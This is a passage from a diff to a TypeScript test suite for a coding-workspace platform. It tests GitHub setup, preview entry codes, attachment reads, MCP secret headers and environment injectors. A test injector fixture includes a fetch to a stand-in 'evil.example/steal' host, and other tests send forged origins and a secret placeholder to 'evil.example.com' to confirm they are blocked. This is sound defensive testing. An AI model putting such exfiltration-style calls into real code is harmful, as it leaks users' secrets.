@@ -16,7 +16,7 @@ import {
 import type { WorkspaceDO } from "../../src/do/workspace/index.ts";
 import { SYSTEM_CREDENTIALS, GITHUB_APP_KEYS, type GithubAppConfig } from "../../src/do/credential.ts";
 import { clearGithubAppConfigCache } from "../../src/github/app.ts";
-import { handleAttachment } from "../../src/http/attachments.ts";
+import { handleAttachment, handleAttachmentRead } from "../../src/http/attachments.ts";
 import { handleChannel } from "../../src/http/channels.ts";
 import { handleApiV1 } from "../../src/http/native.ts";
 import { handlePreview } from "../../src/http/preview.ts";
@@ -28,6 +28,8 @@ import {
   OWNER_GITHUB_ID,
   internals,
   seedCredentials,
+  installFakes,
+  FakeTempod,
   seedProject,
   seedWorkspace,
   waitFor,
@@ -464,6 +466,7 @@ describe("projects and GitHub (02, Projects and GitHub)", () => {
       defaultBranch: "main",
       settings: {},
       sortOrder: 1,
+      environmentId: null,
     });
     expect(list.map((p: Row) => p["id"])).not.toContain(other.projectId);
   });
@@ -510,6 +513,27 @@ describe("projects and GitHub (02, Projects and GitHub)", () => {
       o.installationId,
     );
     expect(renamed?.["account_login"]).toBe("acme-renamed");
+    gh.installations = [];
+  });
+
+  it("GitHub's setup_url stores the new installation for a signed-in owner (05 setup step 5)", async () => {
+    const o = await owner();
+    gh.installations = [
+      { id: o.installationId, account: { login: "acme", type: "Organization" }, suspended_at: null },
+      { id: 556001, account: { login: "fresh-org", type: "Organization" }, suspended_at: null },
+    ];
+    const anonymous = await setup("/setup/github/installed?installation_id=556001&setup_action=install");
+    expect(anonymous.status).toBe(302);
+    expect(await d1Row("SELECT * FROM github_installations WHERE installation_id = 556001")).toBeNull();
+    const res = await setup("/setup/github/installed?installation_id=556001&setup_action=install", {
+      headers: { Cookie: await sessionCookie(o.token) },
+    });
+    expect(res.status).toBe(302);
+    expect(res.headers.get("Location")).toBe("https://tempo.test/");
+    expect(await d1Row("SELECT * FROM github_installations WHERE installation_id = 556001")).toMatchObject({
+      user_id: o.userId,
+      account_login: "fresh-org",
+    });
     gh.installations = [];
   });
 
@@ -724,6 +748,62 @@ describe("projects and GitHub (02, Projects and GitHub)", () => {
 // 02, Workspaces; 03, Create a workspace
 // ======================================================================
 
+describe("listModels", () => {
+  it("discovers the configured agent's models before any workspace or chat exists", async () => {
+    const o = await owner();
+    await env.CREDENTIALS.getByName(o.userId).putSecret("claude.oauth_token", "token");
+    const stub = env.WORKSPACE.getByName(`models:${o.userId}`);
+    const tempod = new FakeTempod();
+    tempod.on("session.start", () => ({
+      acpSessionId: "discovery",
+      modes: [],
+      availableCommands: [],
+      capabilities: {},
+      reloaded: false,
+      handoff: false,
+      configOptions: [
+        {
+          id: "model",
+          name: "Model",
+          category: "model",
+          type: "select",
+          currentValue: "a",
+          options: [
+            {
+              group: "group",
+              name: "Group",
+              options: [
+                { value: "a", name: "Model A" },
+                { value: "b", name: "Model B" },
+              ],
+            },
+          ],
+        },
+      ],
+    }));
+    const { container } = await installFakes(stub, tempod);
+    expect(ok(await call("listModels", o, {}))).toEqual([
+      {
+        agent: "claude",
+        currentValue: "a",
+        options: [
+          { value: "a", name: "Model A" },
+          { value: "b", name: "Model B" },
+        ],
+      },
+    ]);
+    expect(await d1Rows("SELECT id FROM workspaces WHERE user_id = ?", o.userId)).toEqual([]);
+    expect(await doRows(stub, "SELECT id FROM sessions")).toEqual([]);
+    expect(tempod.requestsOf("session.prompt")).toEqual([]);
+    expect(tempod.requestsOf("session.close")).toHaveLength(1);
+    expect(container.destroyed).toBe(1);
+    await call("listModels", o, {});
+    expect(tempod.requestsOf("session.start")).toHaveLength(1);
+    const other = await owner();
+    expect(ok(await call("listModels", other, {}))).toEqual([]);
+  });
+});
+
 describe("createWorkspace (03, Create a workspace)", () => {
   it("picks the first unused city and the branch <branch_prefix><slug>, and returns a starting summary", async () => {
     const o = await owner();
@@ -800,15 +880,21 @@ describe("createWorkspace (03, Create a workspace)", () => {
         projectId: o.projectId,
         source: { kind: "new", baseBranch: "main" },
         agent: "codex",
+        model: "chosen-model",
         prompt: { text },
       }),
     );
     expect(ws.title).toBe(text.trim().slice(0, 60));
     expect(ws.defaultAgent).toBe("codex");
+    const chat = await doRows(env.WORKSPACE.getByName(ws.id), "SELECT agent, config_json FROM sessions");
+    expect(chat).toHaveLength(1);
+    expect(JSON.parse(chat[0]!["config_json"])).toEqual({ model: "chosen-model" });
   });
 
   it("defaults the agent to the project's agent.default", async () => {
-    const o = await owner({ settingsJson: JSON.stringify({ agent: { default: "opencode", model: "x/y" } }) });
+    const o = await owner({
+      settingsJson: JSON.stringify({ agent: { default: "opencode", models: { opencode: "x/y" } } }),
+    });
     const ws = ok(
       await call("createWorkspace", o, {
         projectId: o.projectId,
@@ -942,6 +1028,49 @@ describe("createWorkspace (03, Create a workspace)", () => {
     );
     expect(ws).toMatchObject({ branch: "pr-branch-8", baseBranch: "develop", slug: "otter" });
     gh.pulls.delete(8);
+  });
+
+  it("source.kind 'pr' keeps the PR's number, state and title in D1 and the WorkspaceDO", async () => {
+    // 03 Create 3–4 and init 1: number, title and state (as in Status polling); D1 pr_number and pr_state.
+    const o = await owner();
+    const cases: Array<[number, Row, string]> = [
+      [21, { draft: true }, "draft"],
+      [22, {}, "open"],
+      [23, { state: "closed" }, "closed"],
+      [24, { state: "closed", merged: true, merged_at: "2026-10-12T00:00:00Z" }, "merged"],
+    ];
+    for (const [number, patch, state] of cases) {
+      gh.pulls.set(number, { ...pull(number, `pr-branch-${number}`, o.repoId), ...patch });
+      const ws = ok(
+        await call("createWorkspace", o, { projectId: o.projectId, source: { kind: "pr", number } }),
+      );
+      expect(ws).toMatchObject({ prNumber: number, prState: state });
+      expect(await d1Row("SELECT pr_number, pr_state FROM workspaces WHERE id = ?", ws.id)).toEqual({
+        pr_number: number,
+        pr_state: state,
+      });
+      const stub = env.WORKSPACE.getByName(ws.id);
+      expect(ok(await stub.getWorkspace({}))).toMatchObject({
+        prNumber: number,
+        prState: state,
+        prTitle: `PR ${number}`,
+      });
+      expect(await doRows(stub, "SELECT pr_number, pr_state FROM workspace")).toEqual([
+        { pr_number: number, pr_state: state },
+      ]);
+      gh.pulls.delete(number);
+    }
+    const plain = ok(
+      await call("createWorkspace", o, {
+        projectId: o.projectId,
+        source: { kind: "new", baseBranch: "main" },
+      }),
+    );
+    expect(plain).toMatchObject({ prNumber: null, prState: null });
+    expect(await d1Row("SELECT pr_number, pr_state FROM workspaces WHERE id = ?", plain.id)).toEqual({
+      pr_number: null,
+      pr_state: null,
+    });
   });
 
   it("source.kind 'pr' from a fork fails with VALIDATION_FAILED and the exact message", async () => {
@@ -1277,6 +1406,35 @@ describe("/api/v1 (07, Server changes for native clients)", () => {
     }
   });
 
+  it("publishes the signed DMG hash from the same release as latestMacClient", async () => {
+    const sha256 = "a".repeat(64);
+    await env.DATA.put("clients/mac/latest.json", JSON.stringify({ version: "0.4.2", sha256 }));
+    try {
+      const meta = await (await v1("/api/v1/meta")).json();
+      expect(meta).toMatchObject({ latestMacClient: "0.4.2", latestMacClientSha256: sha256 });
+      expect(conforms(ApiMeta, meta)).toBe(true);
+    } finally {
+      await env.DATA.delete("clients/mac/latest.json");
+    }
+  });
+
+  it("omits invalid download hashes and rejects malformed release versions", async () => {
+    for (const release of [
+      { version: "0.4.2", sha256: "invalid" },
+      { version: 42, sha256: "a".repeat(64) },
+    ]) {
+      await env.DATA.put("clients/mac/latest.json", JSON.stringify(release));
+      try {
+        const meta = (await (await v1("/api/v1/meta")).json()) as Row;
+        expect(meta["latestMacClientSha256"]).toBeUndefined();
+        expect(meta["latestMacClient"]).toBe(typeof release.version === "string" ? release.version : null);
+        expect(conforms(ApiMeta, meta)).toBe(true);
+      } finally {
+        await env.DATA.delete("clients/mac/latest.json");
+      }
+    }
+  });
+
   it("POST /api/v1/rpc/<function> accepts a bearer token (AT-24)", async () => {
     const o = await owner();
     const res = await v1("/api/v1/rpc/listProjects", {
@@ -1477,6 +1635,21 @@ describe("channel upgrades (02, Upgrade rules for all three channels; 07, WebSoc
     sock.ws.close(1000);
   });
 
+  it("drops client x-tempo-* headers, so a forged Browser Run header still opens the channel", async () => {
+    const o = await owner();
+    const { workspaceId } = await seedWorkspace(o);
+    const res = (await upgrade(`/api/ws/workspace/${workspaceId}?sinceRev=0`, {
+      Authorization: `Bearer ${o.token}`,
+      "x-tempo-browser-app": "3000",
+      "x-tempo-browser-cdp": "1",
+    }))!;
+    expect(res.status).toBe(101);
+    const sock = accept(res);
+    await waitFor(() => sock.messages.length > 0, 5000, "workspace hello");
+    expect(sock.messages[0]).toMatchObject({ type: "hello", v: 1 });
+    sock.ws.close(1000);
+  });
+
   it("upgrades, then closes with 4404 for a workspace the user does not own", async () => {
     const o = await owner();
     const other = await owner();
@@ -1560,6 +1733,22 @@ describe("attachments (02, Sessions and turns: attachments route)", () => {
     expect(rows[0]).toMatchObject({ name: "notes.txt", mime: "text/plain", size_bytes: 11, r2_key: key });
   });
 
+  it("refuses a cookie upload without an Origin header (05, CSRF) and one from another origin", async () => {
+    const o = await owner();
+    const { workspaceId } = await seedWorkspace(o);
+    const cookie = await sessionCookie(o.token);
+    const file = () => formWith(new File(["x"], "x.txt", { type: "text/plain" }));
+    const bare = await postAttachment(workspaceId, file(), { Cookie: cookie });
+    expect(((await bare.json()) as ErrorBody).code).toBe("FORBIDDEN");
+    const foreign = await postAttachment(workspaceId, file(), {
+      Cookie: cookie,
+      Origin: "https://evil.test",
+    });
+    expect(((await foreign.json()) as ErrorBody).code).toBe("FORBIDDEN");
+    const same = await postAttachment(workspaceId, file(), { Cookie: cookie, Origin: APP_ORIGIN });
+    expect(same.status).toBe(200);
+  });
+
   it("returns FILE_TOO_LARGE for a file over 10 MiB and stores nothing", async () => {
     const o = await owner();
     const { workspaceId } = await seedWorkspace(o);
@@ -1629,46 +1818,94 @@ const previewGet = (host: string, path = "/", headers: Record<string, string> = 
 };
 
 describe("preview access (05, Preview access)", () => {
-  it("returns 404 for a first label that does not match the pattern", async () => {
+  const PAGE = "This preview opens only from Tempo.";
+  const isPreview404 = async (res: Response, label = "") => {
+    expect(res.status, label).toBe(404);
+    expect(await res.text(), label).toContain(PAGE);
+    expect(res.headers.get("Referrer-Policy"), label).toBe("no-referrer");
+    expect(res.headers.get("X-Robots-Tag"), label).toBe("noindex, nofollow");
+  };
+  const addPort = (stub: DurableObjectStub<WorkspaceDO>, port: number) =>
+    doRows(stub, "INSERT INTO ports (port, first_seen_at) VALUES (?, 0)", port);
+  const enter = async (entryUrl: string) => {
+    const u = new URL(entryUrl);
+    return previewGet(u.host, `${u.pathname}${u.search}`);
+  };
+
+  it("returns the preview 404 page for a first label that does not match the pattern", async () => {
+    const id = newId();
     for (const host of [
       "previews.test.previews.test",
-      "80-01jaxk3v2m9q8r7t6y5w4e3d2c-k3j9x2m4q8w7e5r1.previews.test",
-      "3000-01JAXK3V2M9Q8R7T6Y5W4E3D2Ci-k3j9x2m4q8w7e5r1.previews.test",
-      "3000-01jaxk3v2m9q8r7t6y5w4e3d2c-short.previews.test",
-      "3000-01jaxk3v2m9q8r7t6y5w4e3d2c-k3j9x2m4q8w7e5r1-x.previews.test",
+      `80-${id}.previews.test`,
+      `3000-${id.toUpperCase().slice(0, 25)}I.previews.test`,
+      `3000-${id}-k3j9x2m4q8w7e5r1.previews.test`,
+      `3000-${id}-x.previews.test`,
+      "nope.previews.test",
     ]) {
-      expect((await previewGet(host)).status, host).toBe(404);
+      await isPreview404(await previewGet(host), host);
     }
   });
 
-  // Regression (fixed): a malformed preview hostname returns the bare 404 before the privacy headers are added.
-  it("adds Referrer-Policy and X-Robots-Tag to the 404 for a bad label too", async () => {
-    // 05 Preview access: "The Worker adds Referrer-Policy: no-referrer and X-Robots-Tag: noindex, nofollow to every preview response."
-    const res = await previewGet("nope.previews.test");
-    expect(res.status).toBe(404);
-    expect(res.headers.get("Referrer-Policy")).toBe("no-referrer");
-    expect(res.headers.get("X-Robots-Tag")).toBe("noindex, nofollow");
-  });
-
-  it("returns 404, never 403, for a wrong token or an unknown workspace, with the privacy headers", async () => {
+  it("openPreview returns a one-time entry link for a detected port and keeps only the code's SHA-256", async () => {
     const o = await owner();
     const { workspaceId, stub } = await seedWorkspace(o);
-    const detail = ok(await stub.getWorkspace({}));
-    const right = String(detail.previewToken);
-    expect(right).toMatch(/^[a-z0-9]{16}$/);
-    const wrong = right.startsWith("a") ? `b${right.slice(1)}` : `a${right.slice(1)}`;
-    for (const host of [
-      `3000-${workspaceId}-${wrong}.previews.test`,
-      `3000-${newId()}-${right}.previews.test`,
-    ]) {
-      const res = await previewGet(host);
-      expect(res.status, host).toBe(404);
-      expect(res.headers.get("Referrer-Policy")).toBe("no-referrer");
-      expect(res.headers.get("X-Robots-Tag")).toBe("noindex, nofollow");
+    await addPort(stub, 3000);
+    const before = Date.now();
+    const { url } = ok(await call("openPreview", o, { workspaceId, port: 3000 }));
+    // 05 Entry link: https://<P>-<workspaceId lowercase>.<PREVIEW_DOMAIN>/__tempo/enter?code=<code>
+    const m = new RegExp(
+      `^https://3000-${workspaceId}\\.previews\\.test/__tempo/enter\\?code=([a-z0-9]{32})$`,
+    ).exec(url);
+    expect(m, url).not.toBeNull();
+    const code = m![1]!;
+    const stored = await doRows(stub, "SELECT * FROM preview_codes");
+    expect(stored).toHaveLength(1);
+    const digest = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(code));
+    const hex = [...new Uint8Array(digest)].map((b) => b.toString(16).padStart(2, "0")).join("");
+    expect(stored[0]).toEqual({ code_hash: hex, port: 3000, expires_at: expect.any(Number) });
+    expect(stored[0]!["expires_at"]).toBeGreaterThanOrEqual(before + 60_000);
+    expect(stored[0]!["expires_at"]).toBeLessThanOrEqual(Date.now() + 60_000);
+    const second = ok(await call("openPreview", o, { workspaceId, port: 3000 })).url;
+    expect(second).not.toBe(url);
+  });
+
+  it("openPreview returns NOT_FOUND for a port that is not detected, and only the owner may call it", async () => {
+    const o = await owner();
+    const { workspaceId, stub } = await seedWorkspace(o);
+    await addPort(stub, 3000);
+    expect(codeOf(await call("openPreview", o, { workspaceId, port: 5173 }))).toBe("NOT_FOUND");
+    expect(codeOf(await call("openPreview", o, { workspaceId, port: 7070 }))).toBe("NOT_FOUND");
+    expect(codeOf(await call("openPreview", null, { workspaceId, port: 3000 }))).toBe("UNAUTHENTICATED");
+    expect(codeOf(await call("openPreview", await seedStranger(), { workspaceId, port: 3000 }))).toBe(
+      "FORBIDDEN",
+    );
+    expect(await doRows(stub, "SELECT * FROM preview_codes")).toHaveLength(0);
+  });
+
+  it("the same 404 page for an unknown workspace, a bad code and a missing or bad cookie", async () => {
+    const o = await owner();
+    const { workspaceId, stub } = await seedWorkspace(o);
+    await addPort(stub, 3000);
+    const host = `3000-${workspaceId}.previews.test`;
+    const unknown = `3000-${newId()}.previews.test`;
+    const cookie = {
+      Cookie: `__Host-tempo_preview=${Math.floor(Date.now() / 1000) + 3600}.${"A".repeat(43)}`,
+    };
+    for (const [label, res] of [
+      ["unknown workspace", await previewGet(unknown)],
+      ["unknown workspace with a cookie", await previewGet(unknown, "/", cookie)],
+      ["unknown workspace, enter", await previewGet(unknown, `/__tempo/enter?code=${"a".repeat(32)}`)],
+      ["missing cookie", await previewGet(host)],
+      ["bad cookie", await previewGet(host, "/", cookie)],
+      ["bad code", await previewGet(host, `/__tempo/enter?code=${"a".repeat(32)}`)],
+      ["short code", await previewGet(host, "/__tempo/enter?code=abc")],
+      ["no code", await previewGet(host, "/__tempo/enter")],
+    ] as const) {
+      await isPreview404(res, label);
     }
   });
 
-  it("serves the waking page for the right token while the container is down, with the privacy headers", async () => {
+  it("serves the waking page after entering while the container is down, with the privacy headers", async () => {
     // A workspace from createWorkspace has no container in tests, so it never comes up.
     const o = await owner();
     const workspaceId = String(
@@ -1680,14 +1917,23 @@ describe("preview access (05, Preview access)", () => {
       )["id"],
     );
     const stub = env.WORKSPACE.getByName(workspaceId);
-    const token = String(ok(await stub.getWorkspace({})).previewToken);
-    const host = `3000-${workspaceId}-${token}.PREVIEWS.test`;
-    const html = await previewGet(host, "/", { Accept: "text/html" });
+    await addPort(stub, 3000);
+    const entered = await enter(ok(await call("openPreview", o, { workspaceId, port: 3000 })).url);
+    expect(entered.status).toBe(303);
+    const value = /^__Host-tempo_preview=([^;]+);/.exec(entered.headers.get("Set-Cookie") ?? "")![1]!;
+    const host = `3000-${workspaceId}.PREVIEWS.test`;
+    const html = await previewGet(host, "/", {
+      Accept: "text/html",
+      Cookie: `__Host-tempo_preview=${value}`,
+    });
     expect(html.status).toBe(200);
     expect(await html.text()).toContain("Waking workspace");
     expect(html.headers.get("Referrer-Policy")).toBe("no-referrer");
     expect(html.headers.get("X-Robots-Tag")).toBe("noindex, nofollow");
-    const api = await previewGet(host, "/api/data", { Accept: "application/json" });
+    const api = await previewGet(host, "/api/data", {
+      Accept: "application/json",
+      Cookie: `__Host-tempo_preview=${value}`,
+    });
     expect(api.status).toBe(503);
     expect(api.headers.get("Retry-After")).toBe("5");
     expect(api.headers.get("Referrer-Policy")).toBe("no-referrer");
@@ -1944,6 +2190,7 @@ describe("GitHub App setup (05, Deployment and configuration: GitHub App setup)"
         hook_attributes: { active: false },
       });
       expect(manifest["default_permissions"]).toEqual({
+        email_addresses: "read",
         contents: "write",
         pull_requests: "write",
         metadata: "read",
@@ -2003,5 +2250,530 @@ describe("GitHub App setup (05, Deployment and configuration: GitHub App setup)"
     const res = await setup("/setup/github/installed?installation_id=1&setup_action=install");
     expect(res.status).toBe(302);
     expect(res.headers.get("Location")).toBe("https://tempo.test/");
+  });
+});
+
+describe("authenticated attachment reads", () => {
+  it("serves owner image bytes after reload and while archived, with private safety headers", async () => {
+    const o = await owner();
+    const { workspaceId, stub } = await seedWorkspace(o);
+    const upload = await postAttachment(
+      workspaceId,
+      formWith(new File(["png bytes"], "shot.png", { type: "image/png" })),
+      { Authorization: `Bearer ${o.token}` },
+    );
+    const a = (await upload.json()) as Row;
+    await runInDurableObject(stub, (_i: WorkspaceDO, state: DurableObjectState) => {
+      state.storage.sql.exec("UPDATE workspace SET archived_at = 1, state = 'archived'");
+    });
+    await env.DB.prepare("UPDATE workspaces SET archived_at = 1 WHERE id = ?").bind(workspaceId).run();
+    const url = `${APP_ORIGIN}/api/workspaces/${workspaceId}/attachments/${a["attachmentId"]}`;
+    const read = (headers: HeadersInit) =>
+      handleAttachmentRead(new Request(url, { headers }), env, workspaceId, a["attachmentId"]);
+    const response = await read({ Cookie: await sessionCookie(o.token) });
+    expect(response.status).toBe(200);
+    expect(await response.text()).toBe("png bytes");
+    expect(response.headers.get("Content-Type")).toBe("image/png");
+    expect(response.headers.get("Cache-Control")).toBe("private, no-store");
+    expect(response.headers.get("X-Content-Type-Options")).toBe("nosniff");
+    expect((await read({})).status).toBe(401);
+    expect((await read({ Authorization: `Bearer ${o.token}`, Origin: "https://evil.test" })).status).toBe(
+      403,
+    );
+    expect(
+      (
+        await handleAttachmentRead(
+          new Request(url, { headers: { Authorization: `Bearer ${o.token}` } }),
+          env,
+          workspaceId,
+          newId(),
+        )
+      ).status,
+    ).toBe(404);
+    const other = await owner();
+    expect((await read({ Authorization: `Bearer ${other.token}` })).status).toBe(404);
+  });
+
+  it("forces active content to download and rejects inconsistent or missing objects", async () => {
+    const o = await owner();
+    const { workspaceId, stub } = await seedWorkspace(o);
+    const upload = await postAttachment(
+      workspaceId,
+      formWith(new File(["<svg/>"], "shot.svg", { type: "image/svg+xml" })),
+      { Authorization: `Bearer ${o.token}` },
+    );
+    const a = (await upload.json()) as Row;
+    const read = () =>
+      handleAttachmentRead(
+        new Request(`${APP_ORIGIN}/api/workspaces/${workspaceId}/attachments/${a["attachmentId"]}`, {
+          headers: { Authorization: `Bearer ${o.token}` },
+        }),
+        env,
+        workspaceId,
+        a["attachmentId"],
+      );
+    const response = await read();
+    expect(response.headers.get("Content-Type")).toBe("application/octet-stream");
+    expect(response.headers.get("Content-Disposition")).toBe("attachment");
+    await runInDurableObject(stub, (_i: WorkspaceDO, state: DurableObjectState) => {
+      state.storage.sql.exec("UPDATE attachments SET size_bytes = 9 WHERE id = ?", a["attachmentId"]);
+    });
+    expect((await read()).status).toBe(413);
+    await env.DATA.delete(`attachments/${workspaceId}/${a["attachmentId"]}/shot.svg`);
+    expect((await read()).status).toBe(404);
+  });
+});
+
+// ======================================================================
+// 02, MCP servers; 01, User MCP servers and TempoOutbound rule 12
+// ======================================================================
+
+describe("MCP servers (02, MCP servers; 01, User MCP servers)", () => {
+  const linear = {
+    name: "linear",
+    enabled: true,
+    transport: "http",
+    url: "https://mcp.linear.app/mcp",
+    headers: [
+      { name: "Authorization", secret: true, value: "Bearer lin_secret" },
+      { name: "X-Team", secret: false, value: "core" },
+    ],
+  };
+
+  it("saveMcpServer stores secret headers only in CredentialDO and never returns them", async () => {
+    const o = await owner();
+    const saved = ok(await call("saveMcpServer", o, linear));
+    expect(saved.id).toMatch(ULID);
+    expect(saved.headers).toEqual([
+      { name: "Authorization", secret: true, value: null, set: true },
+      { name: "X-Team", secret: false, value: "core" },
+    ]);
+    const row = await d1Row("SELECT * FROM mcp_servers WHERE id = ?", saved.id);
+    expect(row!["headers_json"]).not.toContain("lin_secret");
+    const creds = env.CREDENTIALS.getByName(o.userId);
+    expect(await creds.getSecret(`mcp.${saved.id}.header.authorization`)).toBe("Bearer lin_secret");
+    expect(ok(await call("listMcpServers", o))).toEqual([saved]);
+  });
+
+  it("an empty secret value keeps the stored value; dropping the header deletes it", async () => {
+    const o = await owner();
+    const saved = ok(await call("saveMcpServer", o, linear));
+    const creds = env.CREDENTIALS.getByName(o.userId);
+    const keep = {
+      ...linear,
+      id: saved.id,
+      enabled: false,
+      headers: [{ name: "Authorization", secret: true }],
+    };
+    expect(ok(await call("saveMcpServer", o, keep)).enabled).toBe(false);
+    expect(await creds.getSecret(`mcp.${saved.id}.header.authorization`)).toBe("Bearer lin_secret");
+    ok(await call("saveMcpServer", o, { ...linear, id: saved.id, headers: [] }));
+    expect(await creds.getSecret(`mcp.${saved.id}.header.authorization`)).toBeNull();
+  });
+
+  it("returns VALIDATION_FAILED for bad input", async () => {
+    const o = await owner();
+    const bad = [
+      { ...linear, name: "Linear" },
+      { ...linear, name: "playwright" },
+      { ...linear, url: "http://mcp.linear.app/mcp" },
+      { ...linear, headers: [{ name: "Authorization", secret: true }] },
+      { ...linear, headers: [{ name: "Host", secret: false, value: "x" }] },
+      { name: "fs", enabled: true, transport: "stdio" },
+      { name: "fs", enabled: true, transport: "stdio", command: "npx", url: "https://x.test" },
+      {
+        name: "fs",
+        enabled: true,
+        transport: "stdio",
+        command: "npx",
+        env: [{ name: "bad-name", value: "v" }],
+      },
+    ];
+    for (const input of bad)
+      expect(codeOf(await call("saveMcpServer", o, input)), JSON.stringify(input)).toBe("VALIDATION_FAILED");
+    ok(await call("saveMcpServer", o, linear));
+    expect(codeOf(await call("saveMcpServer", o, linear))).toBe("VALIDATION_FAILED");
+  });
+
+  it("servers belong to one user: another user cannot see, edit or delete them", async () => {
+    const o = await owner();
+    const other = await owner();
+    const saved = ok(await call("saveMcpServer", o, linear));
+    expect(ok(await call("listMcpServers", other))).toEqual([]);
+    expect(codeOf(await call("saveMcpServer", other, { ...linear, id: saved.id }))).toBe("NOT_FOUND");
+    ok(await call("deleteMcpServer", other, { id: saved.id }));
+    expect(ok(await call("listMcpServers", o))).toHaveLength(1);
+  });
+
+  it("deleteMcpServer removes the row and its secrets", async () => {
+    const o = await owner();
+    const saved = ok(await call("saveMcpServer", o, linear));
+    ok(await call("deleteMcpServer", o, { id: saved.id }));
+    expect(ok(await call("listMcpServers", o))).toEqual([]);
+    expect(
+      await env.CREDENTIALS.getByName(o.userId).getSecret(`mcp.${saved.id}.header.authorization`),
+    ).toBeNull();
+  });
+
+  it("session.start carries enabled servers, with placeholders for secret headers", async () => {
+    const o = await owner();
+    await seedCredentials(o.userId);
+    const saved = ok(await call("saveMcpServer", o, linear));
+    ok(
+      await call("saveMcpServer", o, {
+        name: "fs",
+        enabled: true,
+        transport: "stdio",
+        command: "npx",
+        args: ["-y", "server-fs"],
+        env: [{ name: "ROOT", value: "/workspace" }],
+      }),
+    );
+    ok(await call("saveMcpServer", o, { ...linear, name: "off", enabled: false }));
+    const { stub, tempod } = await seedWorkspace(o, { prompt: "hi" });
+    await driveReady(stub);
+    await waitFor(() => tempod.requestsOf("session.start").length > 0, 5000, "session.start");
+    expect(tempod.requestsOf("session.start")[0].mcpServers).toEqual([
+      {
+        name: "fs",
+        transport: "stdio",
+        command: "npx",
+        args: ["-y", "server-fs"],
+        env: [{ name: "ROOT", value: "/workspace" }],
+      },
+      {
+        name: "linear",
+        transport: "http",
+        url: "https://mcp.linear.app/mcp",
+        headers: [
+          { name: "Authorization", value: `${PLACEHOLDER}:mcp:${saved.id}:authorization` },
+          { name: "X-Team", value: "core" },
+        ],
+      },
+    ]);
+  });
+
+  it("TempoOutbound rule 12 swaps the secret header for the server host only", async () => {
+    const o = await owner({ settingsJson: JSON.stringify({ environment: { egress_policy: "allowlist" } }) });
+    const saved = ok(await call("saveMcpServer", o, linear));
+    const { workspaceId } = await seedWorkspace(o);
+    const placeholder = `${PLACEHOLDER}:mcp:${saved.id}:authorization`;
+    const before = gh.upstream.length;
+    const res = await outbound(workspaceId, o.userId).fetch("https://mcp.linear.app/mcp", {
+      method: "POST",
+      headers: { Authorization: placeholder },
+      body: "{}",
+    });
+    expect(res.status).toBe(200);
+    const sent = gh.upstream.slice(before).find((r) => r.url.hostname === "mcp.linear.app");
+    expect(sent?.headers.get("Authorization")).toBe("Bearer lin_secret");
+    const leak = await outbound(workspaceId, o.userId).fetch("https://evil.example.com/", {
+      headers: { Authorization: placeholder },
+    });
+    expect(leak.status).toBe(403);
+  });
+});
+
+// ======================================================================
+// 01, Environments; 02, Environments server functions
+// ======================================================================
+
+const INJECTOR_CODE = `export default {
+  async fetch(request, env) {
+    const mac = await env.SECRETS.hmac("SIGN_KEY", "hello", { hash: "SHA-256" });
+    const hex = [...new Uint8Array(mac)].map((b) => b.toString(16).padStart(2, "0")).join("");
+    const headers = new Headers(request.headers);
+    headers.set("x-signature", hex);
+    headers.set("x-api-key", "tempo-secret-SIGN_KEY");
+    if (new URL(request.url).pathname === "/escape") return fetch("https://evil.example/steal");
+    if (new URL(request.url).pathname === "/throw") throw new Error("boom with data");
+    return fetch(new Request(request, { headers }));
+  },
+};
+`;
+
+const hmacHex = async (key: string, data: string): Promise<string> => {
+  const k = await crypto.subtle.importKey(
+    "raw",
+    new TextEncoder().encode(key),
+    { name: "HMAC", hash: "SHA-256" },
+    false,
+    ["sign"],
+  );
+  const mac = new Uint8Array(await crypto.subtle.sign("HMAC", k, new TextEncoder().encode(data)));
+  return [...mac].map((b) => b.toString(16).padStart(2, "0")).join("");
+};
+
+/** An owner whose project uses a new environment with the given secrets and injectors. */
+const ownerWithEnvironment = async (
+  update: Record<string, unknown>,
+  values: Record<string, string> = {},
+): Promise<Owner & { environmentId: string }> => {
+  const o = await owner();
+  const created = ok(await call("createEnvironment", o, { name: `env-${newId()}` }));
+  ok(await call("updateEnvironment", o, { environmentId: created.id, ...update }));
+  for (const [name, value] of Object.entries(values))
+    ok(await call("setEnvironmentSecret", o, { environmentId: created.id, name, value }));
+  ok(await call("setProjectEnvironment", o, { projectId: o.projectId, environmentId: created.id }));
+  return { ...o, environmentId: created.id };
+};
+
+describe("environments (01, Environments; 02, Environments)", () => {
+  it("creates, lists, updates and deletes an environment; values are never returned", async () => {
+    const o = await owner();
+    const created = ok(await call("createEnvironment", o, { name: "Payments" }));
+    expect(created).toMatchObject({
+      name: "Payments",
+      egressPolicy: "allowlist",
+      egressAllowlist: [],
+      secrets: [],
+      injectors: [],
+    });
+    expect(codeOf(await call("createEnvironment", o, { name: "Payments" }))).toBe("ENVIRONMENT_EXISTS");
+    const updated = ok(
+      await call("updateEnvironment", o, {
+        environmentId: created.id,
+        egressAllowlist: ["pypi.org", "*.stripe.com"],
+        secrets: [{ name: "STRIPE_KEY", hosts: ["api.stripe.com"] }],
+        injectors: [{ name: "sign", hosts: ["signed.example"], code: INJECTOR_CODE }],
+      }),
+    );
+    expect(updated.injectors[0].sha256).toBe(await sha256(INJECTOR_CODE));
+    expect(updated.secrets).toEqual([{ name: "STRIPE_KEY", hosts: ["api.stripe.com"], set: false }]);
+    ok(
+      await call("setEnvironmentSecret", o, {
+        environmentId: created.id,
+        name: "STRIPE_KEY",
+        value: "sk_live_1",
+      }),
+    );
+    ok(
+      await call("setEnvironmentSecret", o, {
+        environmentId: created.id,
+        name: "LOCAL_URL",
+        value: "pg://x",
+      }),
+    );
+    const [listed] = ok(await call("listEnvironments", o));
+    expect(listed.secrets).toEqual([
+      { name: "STRIPE_KEY", hosts: ["api.stripe.com"], set: true },
+      { name: "LOCAL_URL", hosts: [], set: true },
+    ]);
+    expect(JSON.stringify(listed)).not.toContain("sk_live_1");
+    // A secret left out of `secrets` loses its stored value.
+    ok(
+      await call("updateEnvironment", o, {
+        environmentId: created.id,
+        secrets: [{ name: "LOCAL_URL", hosts: [] }],
+      }),
+    );
+    const creds = env.CREDENTIALS.getByName(o.userId);
+    expect(await creds.listEnvironmentSecretNames(created.id)).toEqual(["LOCAL_URL"]);
+    ok(await call("setProjectEnvironment", o, { projectId: o.projectId, environmentId: created.id }));
+    ok(await call("deleteEnvironment", o, { environmentId: created.id }));
+    expect(ok(await call("listEnvironments", o))).toEqual([]);
+    expect(ok(await call("listProjects", o))[0].environmentId).toBeNull();
+    expect(await creds.listEnvironmentSecretNames(created.id)).toEqual([]);
+  });
+
+  it("rejects duplicate names, bad host patterns, and another owner's environment", async () => {
